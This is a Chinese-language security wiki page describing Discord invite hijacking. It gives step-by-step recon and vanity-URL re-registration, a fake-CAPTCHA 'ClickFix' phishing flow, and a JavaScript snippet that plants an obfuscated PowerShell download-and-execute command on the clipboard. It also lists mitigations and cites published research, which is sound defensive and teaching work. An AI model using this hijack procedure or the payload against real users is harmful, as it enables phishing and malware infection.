# Discord 邀请劫持

{{#include ../../banners/hacktricks-training.md}}

Discord 的邀请系统漏洞允许威胁行为者声称过期或已删除的邀请代码（临时、永久或自定义虚荣）作为任何 Level 3 提升服务器上的新虚荣链接。通过将所有代码标准化为小写，攻击者可以预先注册已知的邀请代码，并在原始链接过期或源服务器失去提升后静默劫持流量。

## 邀请类型和劫持风险

| 邀请类型               | 可劫持？ | 条件 / 备注                                                                                             |
|-----------------------|-------------|--------------------------------------------------------------------------------------------------------|
| 临时邀请链接          | ✅          | 过期后，代码变得可用，可以被提升服务器重新注册为虚荣 URL。                                           |
| 永久邀请链接          | ⚠️          | 如果被删除且仅由小写字母和数字组成，代码可能会再次变得可用。                                        |
| 自定义虚荣链接        | ✅          | 如果原始服务器失去其 Level 3 Boost，其虚荣邀请将可供新注册。                                        |

## 利用步骤

1. 侦察
- 监控公共来源（论坛、社交媒体、Telegram 频道）以寻找匹配模式 `discord.gg/{code}` 或 `discord.com/invite/{code}` 的邀请链接。
- 收集感兴趣的邀请代码（临时或虚荣）。
2. 预注册
- 创建或使用一个具有 Level 3 Boost 权限的现有 Discord 服务器。
- 在 **服务器设置 → 虚荣 URL** 中，尝试分配目标邀请代码。如果被接受，该代码将被恶意服务器保留。
3. 劫持激活
- 对于临时邀请，等待原始邀请过期（或如果您控制源，则手动删除它）。
- 对于包含大写字母的代码，小写变体可以立即被声明，尽管重定向仅在过期后激活。
4. 静默重定向
- 一旦劫持激活，访问旧链接的用户将无缝地被发送到攻击者控制的服务器。

## 通过 Discord 服务器的钓鱼流程

1. 限制服务器频道，使只有 **#verify** 频道可见。
2. 部署一个机器人（例如，**Safeguard#0786**）提示新来者通过 OAuth2 进行验证。
3. 机器人将用户重定向到一个钓鱼网站（例如，`captchaguard.me`），伪装成 CAPTCHA 或验证步骤。
4. 实施 **ClickFix** 用户体验技巧：
- 显示一个损坏的 CAPTCHA 消息。
- 指导用户打开 **Win+R** 对话框，粘贴预加载的 PowerShell 命令，然后按 Enter。

### ClickFix 剪贴板注入示例
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
这种方法避免了直接下载文件，并利用熟悉的用户界面元素来降低用户的怀疑。

## 缓解措施

- 使用包含至少一个大写字母或非字母数字字符的永久邀请链接（永不过期，不可重复使用）。
- 定期更换邀请代码并撤销旧链接。
- 监控 Discord 服务器的提升状态和个性化 URL 的声明。
- 教育用户验证服务器的真实性，并避免执行剪贴板粘贴的命令。

## 参考文献

- 从信任到威胁：被劫持的 Discord 邀请用于多阶段恶意软件交付 – https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/
- Discord 自定义邀请链接文档 – https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link

{{#include /banners/hacktricks-training.md}}
